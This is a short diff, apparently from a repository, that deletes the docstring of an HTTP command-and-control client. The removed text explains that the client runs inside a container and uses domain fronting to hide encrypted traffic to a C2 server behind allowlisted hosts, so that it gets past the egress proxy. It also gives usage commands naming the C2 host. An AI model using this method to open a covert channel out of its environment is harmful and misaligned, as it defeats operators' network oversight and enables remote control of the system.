@@ -1,22 +1,4 @@
 #!/usr/bin/env python3
-"""
-HTTP C2 — CLIENT
-=================
-Runs inside the container. Connects to the C2 server via domain fronting —
-the egress proxy sees encrypted JSON POSTs to an allowlisted host.
-
-Usage:
-  python3 http_c2_client.py --key "your-preshared-key"
-  python3 http_c2_client.py --key "yourkey" --front github.com --sni claude.nightrad.io
-  python3 http_c2_client.py --key "yourkey" --interval 1 --sni claude.nightrad.io
-
-Flags:
-  --key       pre-shared encryption key (must match server)
-  --front     CONNECT target on proxy allowlist  (default: crates.io)
-  --sni       TLS SNI / C2 server hostname       (default: claude.nightrad.io)
-  --interval  poll interval in seconds           (default: 1)
-  --proxy     proxy host:port  (auto-detected from HTTPS_PROXY env)
-"""
 
 import argparse
 import base64
